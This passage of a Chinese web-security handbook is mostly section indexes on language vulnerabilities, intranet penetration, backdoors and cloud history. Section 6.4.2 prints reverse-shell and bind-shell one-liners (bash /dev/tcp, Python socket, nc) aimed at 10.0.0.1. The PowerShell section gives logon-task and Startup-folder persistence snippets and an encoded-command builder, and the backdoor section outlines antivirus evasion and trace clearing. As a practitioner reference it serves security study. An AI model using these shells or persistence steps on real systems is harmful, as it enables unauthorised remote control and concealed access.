   * [5.1.11.6. phar 触发点](https://websec.readthedocs.io/zh/latest/language/php/sink.html#phar)
   * [5.1.11.7. 原生类利用](https://websec.readthedocs.io/zh/latest/language/php/sink.html#section-4)
* [5.1.12. 其它](https://websec.readthedocs.io/zh/latest/language/php/misc.html)
   * [5.1.12.1. 低精度](https://websec.readthedocs.io/zh/latest/language/php/misc.html#section-2)
   * [5.1.12.2. 弱类型](https://websec.readthedocs.io/zh/latest/language/php/misc.html#section-3)
   * [5.1.12.3. 命令执行](https://websec.readthedocs.io/zh/latest/language/php/misc.html#section-4)
   * [5.1.12.4. 截断](https://websec.readthedocs.io/zh/latest/language/php/misc.html#section-5)
   * [5.1.12.5. 变量覆盖](https://websec.readthedocs.io/zh/latest/language/php/misc.html#section-6)
   * [5.1.12.6. php特性](https://websec.readthedocs.io/zh/latest/language/php/misc.html#php)
   * [5.1.12.7. /tmp临时文件竞争](https://websec.readthedocs.io/zh/latest/language/php/misc.html#tmp)
* [5.1.13. 版本安全改动](https://websec.readthedocs.io/zh/latest/language/php/version.html)
   * [5.1.13.1. 8.0](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-2)
   * [5.1.13.2. 7.2](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-3)
   * [5.1.13.3. 7.1](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-4)
   * [5.1.13.4. 7.0](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-5)
   * [5.1.13.5. 5.6](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-6)
   * [5.1.13.6. 5.5](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-7)
   * [5.1.13.7. 5.4](https://websec.readthedocs.io/zh/latest/language/php/version.html#section-8)
* [5.1.14. Tricks](https://websec.readthedocs.io/zh/latest/language/php/trick.html)
* [5.1.15. 参考链接](https://websec.readthedocs.io/zh/latest/language/php/ref.html)
   * [5.1.15.1. Bypass](https://websec.readthedocs.io/zh/latest/language/php/ref.html#bypass)
   * [5.1.15.2. Tricks](https://websec.readthedocs.io/zh/latest/language/php/ref.html#tricks)
   * [5.1.15.3. WebShell](https://websec.readthedocs.io/zh/latest/language/php/ref.html#webshell-1)
   * [5.1.15.4. Phar](https://websec.readthedocs.io/zh/latest/language/php/ref.html#phar)
   * [5.1.15.5. 运行](https://websec.readthedocs.io/zh/latest/language/php/ref.html#section-2)
   * [5.1.15.6. Blog](https://websec.readthedocs.io/zh/latest/language/php/ref.html#blog)

---

## [5.2. Python](https://websec.readthedocs.io/zh/latest/language/python/index.html)

该页面为 Python 安全章节的目录索引页，包含以下子章节：

| 序号 | 主题 | 链接 |
|------|------|------|
| 5.2.1 | 格式化字符串 | `/language/python/fmtstr.html` |
| 5.2.2 | 反序列化 | `/language/python/unserialize.html` |
| 5.2.3 | 沙箱 | `/language/python/sandbox.html` |
| 5.2.4 | 框架 | `/language/python/framework.html` |
| 5.2.5 | 代码混淆 | `/language/python/obfuscate.html` |
| 5.2.6 | Sink | `/language/python/sink.html` |
| 5.2.7 | 参考链接 | `/language/python/ref.html` |

---

## [5.3. Java](https://websec.readthedocs.io/zh/latest/language/java/index.html)

内容索引:

### [5.3.1. 基本概念](https://websec.readthedocs.io/zh/latest/language/java/basic.html)

* **[5.3.1.1. JVM](https://websec.readthedocs.io/zh/latest/language/java/basic.html#jvm)**
* **[5.3.1.2. JDK](https://websec.readthedocs.io/zh/latest/language/java/basic.html#jdk)**
* **[5.3.1.3. JMX](https://websec.readthedocs.io/zh/latest/language/java/basic.html#jmx)**
* **[5.3.1.4. JNI](https://websec.readthedocs.io/zh/latest/language/java/basic.html#jni)**
* **[5.3.1.5. JNA](https://websec.readthedocs.io/zh/latest/language/java/basic.html#jna)**
* **[5.3.1.6. OGNL](https://websec.readthedocs.io/zh/latest/language/java/basic.html#ognl)**
* **[5.3.1.7. IO模型](https://websec.readthedocs.io/zh/latest/language/java/basic.html#io)**
* **[5.3.1.8. 反射](https://websec.readthedocs.io/zh/latest/language/java/basic.html#section-2)**

### [5.3.2. 类](https://websec.readthedocs.io/zh/latest/language/java/class.html)

* **[5.3.2.1. 生命周期](https://websec.readthedocs.io/zh/latest/language/java/class.html#section-2)**

### [5.3.3. 部分运行选项与说明](https://websec.readthedocs.io/zh/latest/language/java/opt.html)

### [5.3.4. 框架](https://websec.readthedocs.io/zh/latest/language/java/framework.html)

* **[5.3.4.1. Servlet](https://websec.readthedocs.io/zh/latest/language/java/framework.html#servlet)**
* **[5.3.4.2. Struts 2](https://websec.readthedocs.io/zh/latest/language/java/framework.html#struts-2)**
* **[5.3.4.3. Spring](https://websec.readthedocs.io/zh/latest/language/java/framework.html#spring)**
* **[5.3.4.4. Shiro](https://websec.readthedocs.io/zh/latest/language/java/framework.html#shiro)**

### [5.3.5. 容器](https://websec.readthedocs.io/zh/latest/language/java/container.html)

* **[5.3.5.1. Tomcat](https://websec.readthedocs.io/zh/latest/language/java/container.html#tomcat)**
* **[5.3.5.2. Weblogic](https://websec.readthedocs.io/zh/latest/language/java/container.html#weblogic)**
* **[5.3.5.3. JBoss](https://websec.readthedocs.io/zh/latest/language/java/container.html#jboss)**
* **[5.3.5.4. Jetty](https://websec.readthedocs.io/zh/latest/language/java/container.html#jetty)**

### [5.3.6. 沙箱](https://websec.readthedocs.io/zh/latest/language/java/sandbox.html)

* **[5.3.6.1. 简介](https://websec.readthedocs.io/zh/latest/language/java/sandbox.html#section-2)**
* **[5.3.6.2. 相关CVE](https://websec.readthedocs.io/zh/latest/language/java/sandbox.html#cve)**

### [5.3.7. 反序列化](https://websec.readthedocs.io/zh/latest/language/java/unserialize.html)

* **[5.3.7.1. 简介](https://websec.readthedocs.io/zh/latest/language/java/unserialize.html#section-2)**
* **[5.3.7.2. 漏洞利用](https://websec.readthedocs.io/zh/latest/language/java/unserialize.html#section-6)**
* **[5.3.7.3. 漏洞修复和防护](https://websec.readthedocs.io/zh/latest/language/java/unserialize.html#section-10)**

### [5.3.8. RMI](https://websec.readthedocs.io/zh/latest/language/java/rmi.html)

* **[5.3.8.1. 简介](https://websec.readthedocs.io/zh/latest/language/java/rmi.html#section-1)**
* **[5.3.8.2. 调用步骤](https://websec.readthedocs.io/zh/latest/language/java/rmi.html#section-2)**
* **[5.3.8.3. 样例](https://websec.readthedocs.io/zh/latest/language/java/rmi.html#section-3)**
* **[5.3.8.4. T3协议](https://websec.readthedocs.io/zh/latest/language/java/rmi.html#t3)**
* **[5.3.8.5. JRMP](https://websec.readthedocs.io/zh/latest/language/java/rmi.html#jrmp)**

### [5.3.9. JNDI](https://websec.readthedocs.io/zh/latest/language/java/jndi.html)

* **[5.3.9.1. 简介](https://websec.readthedocs.io/zh/latest/language/java/jndi.html#section-1)**
* **[5.3.9.2. JNDI注入](https://websec.readthedocs.io/zh/latest/language/java/jndi.html#jndi-1)**
* **[5.3.9.3. 攻击载荷](https://websec.readthedocs.io/zh/latest/language/java/jndi.html#section-2)**

### [5.3.10. JDK](https://websec.readthedocs.io/zh/latest/language/java/jdk.html)

* **[5.3.10.1. JDK 8](https://websec.readthedocs.io/zh/latest/language/java/jdk.html#jdk-8)**
* **[5.3.10.2. JDK 7](https://websec.readthedocs.io/zh/latest/language/java/jdk.html#jdk-7)**
* **[5.3.10.3. JDK 6](https://websec.readthedocs.io/zh/latest/language/java/jdk.html#jdk-6)**

### [5.3.11. 常见Sink](https://websec.readthedocs.io/zh/latest/language/java/sink.html)

* **[5.3.11.1. 命令执行/注入](https://websec.readthedocs.io/zh/latest/language/java/sink.html#section-1)**
* **[5.3.11.2. XXE](https://websec.readthedocs.io/zh/latest/language/java/sink.html#xxe)**
* **[5.3.11.3. SSRF](https://websec.readthedocs.io/zh/latest/language/java/sink.html#ssrf)**
* **[5.3.11.4. 反序列化](https://websec.readthedocs.io/zh/latest/language/java/sink.html#section-2)**

### [5.3.12. WebShell](https://websec.readthedocs.io/zh/latest/language/java/webshell.html)

* **[5.3.12.1. BCEL字节码](https://websec.readthedocs.io/zh/latest/language/java/webshell.html#bcel)**
* **[5.3.12.2. 自定义类加载器](https://websec.readthedocs.io/zh/latest/language/java/webshell.html#section-1)**
* **[5.3.12.3. 执行命令变式](https://websec.readthedocs.io/zh/latest/language/java/webshell.html#section-2)**
* **[5.3.12.4. 基于反射](https://websec.readthedocs.io/zh/latest/language/java/webshell.html#section-3)**
* **[5.3.12.5. 其他Shell变式](https://websec.readthedocs.io/zh/latest/language/java/webshell.html#shell)**
* **[5.3.12.6. Tomcat 容器](https://websec.readthedocs.io/zh/latest/language/java/webshell.html#tomcat)**

### [5.3.13. 参考链接](https://websec.readthedocs.io/zh/latest/language/java/ref.html)

* **[5.3.13.1. 官方文档](https://websec.readthedocs.io/zh/latest/language/java/ref.html#section-2)**
* **[5.3.13.2. 机制说明](https://websec.readthedocs.io/zh/latest/language/java/ref.html#section-3)**
* **[5.3.13.3. 反序列化](https://websec.readthedocs.io/zh/latest/language/java/ref.html#section-4)**
* **[5.3.13.4. 沙箱](https://websec.readthedocs.io/zh/latest/language/java/ref.html#section-8)**
* **[5.3.13.5. 框架](https://websec.readthedocs.io/zh/latest/language/java/ref.html#section-9)**
* **[5.3.13.6. RMI](https://websec.readthedocs.io/zh/latest/language/java/ref.html#rmi)**
* **[5.3.13.7. JNDI](https://websec.readthedocs.io/zh/latest/language/java/ref.html#jndi)**
* **[5.3.13.8. WebShell](https://websec.readthedocs.io/zh/latest/language/java/ref.html#webshell)**
* **[5.3.13.9. 其他漏洞](https://websec.readthedocs.io/zh/latest/language/java/ref.html#section-11)**

---

## [5.4. JavaScript](https://websec.readthedocs.io/zh/latest/language/javascript/index.html)

该页面为 JavaScript 安全章节的目录索引页，包含以下子章节：

| 编号 | 章节名称 | 主要内容 |
|------|----------|----------|
| 5.4.1 | ECMAScript | 简介、版本历史、ES6 特性 |
| 5.4.2 | 引擎 | V8、SpiderMonkey、JavaScriptCore、ChakraCore、JScript、JerryScript |
| 5.4.3 | WebAssembly | 简介、执行机制、安全相关 |
| 5.4.4 | 作用域与闭包 | 作用域链、闭包、全局对象 |
| 5.4.5 | 严格模式 | 调用方式、行为改变 |
| 5.4.6 | 异步机制 | async/await、Promise、执行队列 |
| 5.4.7 | 原型链 | 显式/隐式原型、new 过程、**原型链污染** |
| 5.4.8 | 沙箱逃逸 | 前端沙箱、服务端沙箱 |
| 5.4.9 | 反序列化 | Payload 构造方法 |
| 5.4.10 | jsfuck cheat sheet | 字符构造表 |
| 5.4.11 | Trick | 正则表达式构造字符技巧 |
| 5.4.12 | 其他 | 命令执行、反调试技巧、对象拷贝、常见 Sink |
| 5.4.13 | 参考链接 | 学习资源 |

---

## [5.5. Golang](https://websec.readthedocs.io/zh/latest/language/golang.html)

### 5.5.1. Golang Runtime

Go中的线程被称为Goroutine或G，内核线程被称为M。这些G被调度到M上，即所谓的G：M线程模型，或更常用的M：N线程模型，用户空间线程或green线程模型。

### 5.5.2. 字符串处理

* Go 源代码始终为 UTF-8
* 代表 Unicode 码点的字节序列称为 `rune`
* Go 不保证字符串中的字符被规范化
* 字符串可以包含任意字节
* 字符串中不包含字节级转义符时，字符串始终包含有效的 UTF-8 序列

### 5.5.3. 参考链接

* [Strings, bytes, runes and characters in Go](https://blog.golang.org/strings)

---

## [5.6. Ruby](https://websec.readthedocs.io/zh/latest/language/ruby.html)

### 5.6.1. 参考链接

* [ruby deserialization](https://www.elttam.com.au/blog/ruby-deserialization/)
* [Ruby 安全漫谈](https://mp.weixin.qq.com/s/ECLwMbbrf9lWXkhbUergXg)

---

## [5.7. ASP](https://websec.readthedocs.io/zh/latest/language/asp.html)

### 5.7.1. 简介

ASP是动态服务器页面(Active Server Page)，是微软开发的类似CGI脚本程序的一种应用，其网页文件的格式是 `.asp` 。

### 5.7.2. 参考链接

- [Deformity ASP/ASPX Webshell、Webshell Hidden Learning](https://www.cnblogs.com/LittleHann/p/5016999.html)

---

## [5.8. PowerShell](https://websec.readthedocs.io/zh/latest/language/powershell.html)

### 5.8.1. 执行策略

PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略。

- **Restricted** 策略可以执行单个的命令，但是不能执行脚本，Windows 8、 Windows Server 2012中默认使用该策略。
- **AllSigned** 策略允许执行所有具有数字签名的脚本。
- **RemoteSigned** 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。
- **Unrestricted** 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。
- **Bypass** 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。
- **Undefined** 表示没有设置脚本策略，会继承或使用默认的脚本策略。

### 5.8.2. 混淆

混淆相关的参数：

- `-EC`
- `-EncodedCommand`
- `-EncodedComman`
- `-EncodedComma`
- `-EncodedComm`

### 5.8.3. 常见功能

#### 5.8.3.1. 计划任务

```powershell
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
```

#### 5.8.3.2. 创建链接

```powershell
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\test.lnk")
$ShortCut.TargetPath="cmd.exe"
$ShortCut.WorkingDirectory = "C:\Windows\System32";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = "test.";
$ShortCut.Save()
```

#### 5.8.3.3. 编码

```powershell
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
```

#### 5.8.3.4. 其他

**别名**: `alias`

**下载文件**: `Invoke-WebRequest "https://example.com/test.zip" -OutFile "$env:TEMP\test.zip"`

**解压缩**: `Expand-Archive $env:TEMP\test.zip $env:TEMP\test -Force`

**进程**:
- 启动进程 `Start-Process calc`
- 停止进程 `Stop-Process -ID $pid`

**文件**:
- 新建文件 `New-Item #{file_path} -Force | Out-Null`
- 设置文件内容 `Set-Content -Path #{file_path} -Value "#{Content}"`
- 追加文件内容 `Add-Content -Path #{file_path} -Value "#{Content}"`
- 复制文件 `Copy-Item src dst`
- 删除文件 `Remove-Item #{outputfile} -Force -ErrorAction Ignore`
- 子目录 `Get-ChildItem #{file_path}`

**服务**:
- 获取服务 `Get-Service -Name "#{service_name}"`
- 启动服务 `Start-Service -Name "#{service_name}"`
- 停止服务 `Stop-Service -Name "#{service_name}"`
- 删除服务 `Remove-Service -Name "#{service_name}"`

**获取WMI支持**: `Get-WmiObject -list`

### 5.8.4. 参考链接

- [PowerShell 官方文档](https://docs.microsoft.com/zh-cn/powershell/)

---

## [5.9. Shell](https://websec.readthedocs.io/zh/latest/language/shell.html)

### 5.9.1. 简介

Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。

Linux 包含多种 Shell ，常见的有：

- **Bourne Shell**（ATT的Bourne开发，名为sh）
- **Bourne Again Shell**（/bin/bash）
- **C Shell**（Bill Joy开发，名为csh）
- **K Shell**（ATT的David G.koun开发，名为ksh）
- **Z Shell**（Paul Falstad开发，名为zsh）

### 5.9.2. 元字符

Shell一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的Shell支持的元字符可能会不相同。

常见的元字符如下：

| 元字符 | 说明 |
|--------|------|
| `IFS` | 由 <space> 或 <tab> 或 <enter> 三者之一组成 |
| `CR` | 由 <enter> 产生 |
| `=` | 设定变量 |
| `$` | 作变量或运算替换 |
| `>` | 重定向 stdout |
| `>>` | 追加到文件 |
| `<` | 重定向 stdin |
| `\|` | 命令管道 |
| `&` | 后台执行命令 |
| `;` | 在前一个命令结束后，执行下一个命令 |
| `&&` | 在前一个命令未报错执行后，执行下一个命令 |
| `\|\|` | 在前一个命令执行报错后，执行下一个命令 |
| `'` | 在单引号内的命令会保留原来的值 |
| `"` | 在双引号内的命令会允许变量替换 |
| `` ` `` | 在反引号内的内容会当成命令执行并替换 |
| `()` | 在子Shell中执行命令 |
| `{}` | 在当前Shell中执行命令 |
| `~` | 当前用户的主目录 |
| `!number` | 执行历史命令，如 `!1` |

### 5.9.3. 通配符

除元字符外，通配符（wildcard）也是shell中的一种特殊字符。当shell在参数中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。

常见的通配符如下：

| 通配符 | 说明 |
|--------|------|
| `*` | 匹配 0 或多个字符 |
| `?` | 匹配任意一个字符 |
| `[list]` | 匹配 list 中的任意一个字符 |
| `[!list]` | 匹配除 list 外的任意一个字符 |
| `[a-c]` | 匹配 a-c 中的任意一个字符 |
| `{string1,string2,...}` | 分别匹配其中字符串 |

---

## [5.10. CSharp](https://websec.readthedocs.io/zh/latest/language/csharp/index.html)

该页面为 C# 安全章节的目录索引页：

- 5.10.1. 利用技巧
  - 5.10.1.1. P/Invoke
  - 5.10.1.2. D/Invoke
- 5.10.2. 参考链接
  - 5.10.2.1. .Net
  - 5.10.2.2. 利用技巧

---

## [6.1. Windows内网渗透](https://websec.readthedocs.io/zh/latest/intranet/windows/index.html)

该页面为 Windows 内网渗透章节的目录索引页：

### 6.1.1 信息收集
- 6.1.1.1 基本命令
- 6.1.1.2 域信息
- 6.1.1.3 用户信息
- 6.1.1.4 网络信息
- 6.1.1.5 防火墙
- 6.1.1.6 密码信息
- 6.1.1.7 票据信息
- 6.1.1.8 特殊文件
- 6.1.1.9 局域网存活主机
- 6.1.1.10 其他

### 6.1.2 持久化
- 6.1.2.1 隐藏文件
- 6.1.2.2 后门
- 6.1.2.3 自启动

### 6.1.3 权限
- 6.1.3.1 UAC
- 6.1.3.2 权限提升

### 6.1.4 痕迹清理
- 6.1.4.1 日志
- 6.1.4.2 注册表
- 6.1.4.3 文件
- 6.1.4.4 时间轴
- 6.1.4.5 彻底删除

### 6.1.5 横向移动
- 6.1.5.1 常见入口
- 6.1.5.2 LOLBAS

### 6.1.6 MSPRC

### 6.1.7 域渗透
- 6.1.7.1 用户
- 6.1.7.2 内网常用协议
- 6.1.7.3 域
- 6.1.7.4 Active Directory
- 6.1.7.5 ADCS
- 6.1.7.6 组策略
- 6.1.7.7 Kerberos的Windows实现
- 6.1.7.8 域内攻击思路
- 6.1.7.9 攻击类型
- 6.1.7.10 防护

---

## [6.2. Linux内网渗透](https://websec.readthedocs.io/zh/latest/intranet/linux/index.html)

该页面为 Linux 内网渗透章节的目录索引页：

### 6.2.1 信息收集

- 6.2.1.1 获取内核，操作系统和设备信息
- 6.2.1.2 用户和组
- 6.2.1.3 用户和权限信息
- 6.2.1.4 环境信息
- 6.2.1.5 进程信息
- 6.2.1.6 服务信息
- 6.2.1.7 计划任务
- 6.2.1.8 网络、路由和通信
- 6.2.1.9 已安装程序
- 6.2.1.10 文件
- 6.2.1.11 公私钥信息
- 6.2.1.12 日志
- 6.2.1.13 虚拟环境检测
- 6.2.1.14 容器内信息收集

### 6.2.2 持久化

- 6.2.2.1 权限提升
- 6.2.2.2 自启动
- 6.2.2.3 后门

### 6.2.3 痕迹清理

- 6.2.3.1 历史命令
- 6.2.3.2 清除/修改日志文件
- 6.2.3.3 登录痕迹
- 6.2.3.4 操作痕迹
- 6.2.3.5 覆写文件
- 6.2.3.6 难点
- 6.2.3.7 注意
- 6.2.3.8 参考链接

---

## [6.3. 后门技术](https://websec.readthedocs.io/zh/latest/intranet/trojan.html)

### 6.3.1. 开发技术

#### 管控功能实现技术
- 系统管理：查看系统基本信息，进程管理，服务管理
- 文件管理：复制/粘贴文件，删除文件/目录，下载/上传文件等
- Shell管理
- 击键记录监控
- 屏幕截取
- 音频监控
- 视频监控
- 隐秘信息查看
- 移动磁盘的动态监控
- 远程卸载

#### 自启动技术

##### Windows自启动
- 基于Windows启动目录的自启动
- 基于注册表的自启动
- 基于服务程序的自启动
- 基于ActiveX控件的自启动
- 基于计划任务（Scheduled Tasks）的自启动

##### Linux自启动

##### 用户态进程隐藏技术
- 基于DLL插入的进程隐藏
  - 远程线程创建技术
  - 设置窗口挂钩（HOOK）技术
- 基于SvcHost共享服务的进程隐藏
- 进程内存替换

##### 数据穿透和躲避技术
- 反弹端口
- 协议隧道
  - HTTP
  - MSN
  - Google Talk

##### 内核级隐藏技术（Rootkit）

##### 磁盘启动级隐藏技术（Bootkit）
- MBR
- BIOS
- NTLDR
- boot.ini

##### 还原软件对抗技术

### 6.3.2. 后门免杀

#### 传统静态代码检测
- 加壳
- 添加花指令
- 输入表免杀

#### 启发式代码检测
- 动态函数调用

#### 云查杀
- 动态增大自身体积
- 更改云查杀服务器域名解析地址
- 断网
- 利用散列碰撞绕过云端"白名单"

#### 攻击主防杀毒软件
- 更改系统时间
- 窗口消息攻击
- 主动发送IRP操纵主防驱动

#### 利用证书信任
- 盗取利用合法证书
- 利用散列碰撞伪造证书
- 利用合法程序 DLL劫持问题的"白加黑"

### 6.3.3. 检测技术

- 基于自启动信息的检测
- 基于进程信息的检测
- 基于数据传输的检测
- Rootkit/Bootkit的检测

### 6.3.4. 后门分析

- 动态分析
- 静态分析
  - 反病毒引擎扫描
  - 文件格式识别
  - 文件加壳识别及脱壳
  - 明文字符串查找
  - 链接库及导入/导出函数分析

---

## [6.4. 综合技巧](https://websec.readthedocs.io/zh/latest/intranet/misc.html)

### 6.4.1. 端口转发

* windows  
   * lcx  
   * netsh
* linux  
   * portmap  
   * iptables
* socket代理  
   * Win: xsocks  
   * Linux: proxychains
* 基于http的转发与socket代理(低权限下的渗透)  
   * 端口转发: tunna  
   * socks代理: reGeorg
* ssh通道  
   * 端口转发  
   * socks

### 6.4.2. 获取shell

* 常规shell反弹

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

* 突破防火墙的imcp_shell反弹
* 正向shell

```bash
nc -e /bin/sh -lp 1234
nc.exe -e cmd.exe -lp 1234
```

### 6.4.3. 内网文件传输

* windows下文件传输  
   * powershell  
   * vbs脚本文件  
   * bitsadmin  
   * 文件共享  
   * 使用telnet接收数据  
   * hta
* linux下文件传输  
   * python  
   * wget  
   * tar + ssh  
   * 利用dns传输数据
* 文件编译  
   * powershell将exe转为txt，再txt转为exe

### 6.4.4. 远程连接 && 执行程序

* at&schtasks
* psexec
* wmic
* wmiexec.vbs
* smbexec
* powershell remoting
* SC创建服务执行
* schtasks
* SMB+MOF || DLL Hijacks
* PTH + compmgmt.msc

---

## [6.5. 参考链接](https://websec.readthedocs.io/zh/latest/intranet/ref.html)

### 6.5.1. Windows

* [Windows 威胁防护](https://docs.microsoft.com/zh-cn/windows/security/threat-protection/)
* [文件寄生 NTFS文件流实际应用](https://gh0st.cn/archives/2017-03-29/1)
* [Windows中常见后门持久化方法总结](https://xz.aliyun.com/t/6461)
* [LOLBAS](https://lolbas-project.github.io/#)
* [渗透技巧——Windows单条日志的删除](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/)
* [windows取证 文件执行记录的获取和清除](https://xz.aliyun.com/t/7155)
* [Getting DNS Client Cached Entries with CIM/WMI](https://www.darkoperator.com/blog/2020/1/14/getting-dns-client-cached-entries-with-cimwmi)
* [Windows单机Persistence](https://lengjibo.github.io/Persistence/)
* [Dumping RDP Credentials](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)

#### 6.5.1.1. 域渗透

* [绕过域账户登录失败次数的限制](https://nosec.org/home/detail/2510.html)
* [域渗透总结](https://mp.weixin.qq.com/s?%5F%5Fbiz=Mzg3NzE5OTA5NQ==&mid=2247483807&idx=1&sn=59be50aa5cc735f055db596269a857ce)
* [got domain admin on internal network](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
* Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques
* [域渗透学习笔记](https://github.com/uknowsec/Active-Directory-Pentest-Notes)
* [QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships](https://qomplx.com/qomplx-knowledge-fundamentals-of-active-directory-trust-relationships/)
* [Kerberos的黄金票据详解](https://www.cnblogs.com/backlion/p/8127868.html)
* [DCShadow explained: A technical deep dive into the latest AD attack technique](https://blog.alsid.eu/dcshadow-explained-4510f52fc19d)
* [Active Directory Security](https://adsecurity.org)
* [Kerberos AD Attacks Kerberoasting](https://blog.xpnsec.com/kerberos-attacks-part-1/)
* [Kerberos之域内委派攻击](https://xz.aliyun.com/t/7517)
* [adsec](https://github.com/cfalta/adsec) An introduction to Active Directory security
* [Attacking Active Directory](https://zer1t0.gitlab.io/posts/attacking%5Fad/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified%5FPre-Owned.pdf)
* [Microsoft Advanced Threat Analytics](https://docs.microsoft.com/zh-cn/advanced-threat-analytics/what-is-ata)

#### 6.5.1.2. 权限提升

* [Windows内网渗透提权](https://www.freebuf.com/articles/system/114731.html)
* [UACMe](https://github.com/hfiref0x/UACME) Defeating Windows User Account Control

#### 6.5.1.3. 协议

* [DEC/RPC](https://github.com/dcerpc/dcerpc)
* [The dark side of Microsoft Remote Procedure Call protocols](https://redcanary.com/blog/msrpc-to-attack/)

### 6.5.2. RedTeam

* [RedTeamManual](https://github.com/klionsec/RedTeamManual)

### 6.5.3. 内网

* [内网安全检查](https://xz.aliyun.com/t/2354)
* [我所知道的内网渗透](https://www.anquanke.com/post/id/92646)
* [从零开始内网渗透学习](https://github.com/l3m0n/pentest%5Fstudy)
* [渗透技巧 从Github下载安装文件](https://xz.aliyun.com/t/1649/)
* [An introduction to privileged file operation abuse on Windows](https://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html)
* [脚本维权tips](https://xz.aliyun.com/t/4522)

### 6.5.4. Cobalt Strike

* [Cobalt Strike 系列笔记](http://blog.leanote.com/post/snowming/Cobalt-Strike)
* [渗透利器Cobalt Strike 第2篇 APT级的全面免杀与企业纵深防御体系的对抗](https://xz.aliyun.com/t/4191)

---

## [7.1. 云发展史](https://websec.readthedocs.io/zh/latest/cloud/history.html)

在2000年到2010年间，云计算主要在 IaaS 的方向发展。 在这个阶段以前，硬件、机房独立维护，运维成本高。应用部署、迁移困难，隔离性差。因此出现了 IaaS ，以基础设施做为服务，通过规模化部署来降低边际成本。 IaaS 的核心是各种虚拟化技术。 在这个时间段，出现了许多相关的虚拟化工具、商业化产品。

2000年，FreeBSD Jail 实现了第一个功能完整的操作系统虚拟化技术。 2001年，VMWare 发布 ESX 和 GSX ，推出虚拟化技术。同年，基于动态二进制翻译的 QEMU 发布。 2002年，亚马逊上线了Amazon Web Services。 2005年，Intel 推出了 VT-x 硬件辅助虚拟化技术。 2006年，KVM 诞生。同年，亚马逊发布了EC2 (Elastic Compute Cloud) 和 S3 (Simple Storage Service) 产品。 2008年，谷歌发布了第一版Google App Engine。 2010年，微软发布了Microsoft Azure。 2010年，开源软件 OpenStack 发布并成立社区。OpenStack 本质上是一组分配、管理虚拟机的自动化工具脚本。在 OpenStack 发布以后，许多做 IaaS 的厂商都使用了 OpenStack。

IaaS 平台一定程度上提高了物理资源的利用效率，但是虚拟机在资源利用上仍然存在局限性。随后2011年到2013年期间，PaaS 开始逐渐成型，用于支持应用程序的完整生命周期，提供应用托管的能力。

2011年，由 VMWare 开发的 CloudFoundry 做为第一款 PaaS 平台开源。支持应用打包、部署、以容器的方式运行、负载均衡等功能。 2011年11月，Google Compute Engine发布。 2012年，OpenShift 开源。 2013年，Docker开源并发布，通过镜像的方式解决了应用开发、测试、生成环境不一致的问题。

2013年以后，云计算越来越成熟。规模也越来越大，容器的规模部署与管理成为了问题。Docker 发布了 Swarm ，而 Google 则发布了 Kubernetes。

2013年，云原生概念被提出。 2014年，Google 发布 Kubernetes。 2015年，Google宣布成立CNCF基金会（云原生计算）。

---

## [7.2. 容器标准(OCI)](https://websec.readthedocs.io/zh/latest/cloud/oci.html)

### 7.2.1. OCI

开放容器标准 (Open Container Initiative, OCI) 是用于规范容器格式和运行时行业标准。目前OCI提出的规范有：

- OCI Runtime Specification
- OCI Image Format
- OCI Distribution Specification

### 7.2.2. CRI

容器运行时 (Container Runtime Interface, CRI) 定义了容器和镜像的接口，目前官方支持的容器运行时包括Docker、Containerd、CRI-O和frakti。

### 7.2.3. 参考链接

#### 7.2.3.1. 文档

- Introducing Container Runtime Interface (CRI) in Kubernetes
- cri-o

#### 7.2.3.2. 实现

- runc — OCI Runtime 的参考实现
- Kata Containers — 提供高性能的硬件虚拟化容器运行时
- gvisor — Go 实现的基于用户态内核的容器运行时
- buildkit — docker build 拆分出来的build项目

---

## [7.3. Docker](https://websec.readthedocs.io/zh/latest/cloud/docker/index.html)

